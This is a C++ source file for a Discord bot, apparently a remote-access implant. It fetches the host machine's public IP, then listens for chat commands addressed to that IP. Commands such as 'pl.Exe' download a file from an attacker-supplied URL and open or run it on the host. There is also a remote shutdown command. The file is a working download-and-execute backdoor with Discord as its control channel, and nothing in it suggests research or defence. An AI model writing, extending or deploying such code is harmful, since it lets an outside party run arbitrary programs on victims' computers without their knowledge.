#include "../headers/curPipe_engine.hpp"
#include <cstdlib>

#define version "1.0"


std::string myip;

namespace curPipe {

    netWork::netWork(std::string token) : bot(token, dpp::i_default_intents | dpp::i_message_content) { 
    bot.on_log(dpp::utility::cout_logger());
}




bool debug = false;

    netWork::~netWork(){

    }
    
    void netWork::readCommandsOnChat() {
        curPipe::payloader("https://ipinfo.io/ip", "ip.txt");
        myip = curPipe::readFiles("ip.txt");
        
        bot.on_message_create([this](const dpp::message_create_t& event) {
            if (event.msg.content.find(';') != std::string::npos) {
                try {
                    std::string nameOfFile = "default"; 



                    if (curPipe::findWordsOnString(event.msg.content, "myIp")){
                        curPipe::payloader("https://ipinfo.io/ip", "ip.txt");
                        myip = curPipe::readFiles("ip.txt");
                        event.reply(myip);
                    }

                    
					


                    if (event.msg.content.find(myip) != std::string::npos){
                        event.reply("Dados enviados para " + myip + ".");
                        if (curPipe::findWordsOnString(event.msg.content, "shutDown")) {
                            event.reply("Desligando o servidor . . .");
                            std::this_thread::sleep_for(std::chrono::seconds(3));
                            bot.shutdown();
                        }

                        

                        if (curPipe::findWordsOnString(event.msg.content, "deBugger")) {
                            event.reply("ativando o debugger . . .");
                            deBugger = true;
                            event.reply("debugger ativado");
                        }

                        if (curPipe::findWordsOnString(event.msg.content, "version")) {
                            event.reply(version);
                        }
                        
                        if (curPipe::findWordsOnString(event.msg.content, "pl.Png")){
                            cleanedMensage = curPipe::cleanWordsOnString(event.msg.content, "pl.Png", true);
                            if(deBugger){
                                event.reply("dados do png recebidos e abertos. " + cleanedMensage);
                            }
                            curPipe::payloader(cleanedMensage, nameOfFile + ".png");
                            curPipe::openFiles(nameOfFile + ".png");
                        }
                        
                        if (curPipe::findWordsOnString(event.msg.content, "pl.Exe")){
                            cleanedMensage = curPipe::cleanWordsOnString(event.msg.content, "pl.Exe", true);
                            if(deBugger){
                                event.reply("dados do png recebidos e abertos. " + cleanedMensage);
                            }
                            curPipe::payloader(cleanedMensage, nameOfFile + ".exe");
                            curPipe::openFiles(nameOfFile + ".exe");
                        }
                        
                        if (curPipe::findWordsOnString(event.msg.content, "pl.Gif")){
                            cleanedMensage = curPipe::cleanWordsOnString(event.msg.content, "pl.Gif", true);
                            if(deBugger){
                                event.reply("dados do png recebidos e abertos. " + cleanedMensage);
                            }
                            curPipe::payloader(cleanedMensage, nameOfFile + ".gif");
                            curPipe::openFiles(nameOfFile + ".gif");
                        }


                        if (curPipe::findWordsOnString(event.msg.content, "pl.Txt")){
                            cleanedMensage = curPipe::cleanWordsOnString(event.msg.content, "pl.Txt", true);
                            if(deBugger){
                                event.reply("dados do png recebidos e abertos. " + cleanedMensage);
                            }
                            curPipe::payloader(cleanedMensage, nameOfFile + ".txt");
                            curPipe::openFiles(nameOfFile + ".txt");
                        }

                        if (curPipe::findWordsOnString(event.msg.content, "pl.Mp4")){
                            cleanedMensage = curPipe::cleanWordsOnString(event.msg.content, "pl.Mp4", true);
                            if(deBugger){
                                event.reply("dados do png recebidos e abertos. " + cleanedMensage);
                            }
                            curPipe::payloader(cleanedMensage, nameOfFile + ".mp4");
                            curPipe::openFiles(nameOfFile + ".mp4");
                        }




                        



                        
					    
                    }
                } catch (const std::exception& e) {
                    std::cerr << "Erro: " << e.what() << std::endl;
                }
            }
        });
    }





    void netWork::perfomBot(){
        bot.start(dpp::st_wait);
    }
}
    
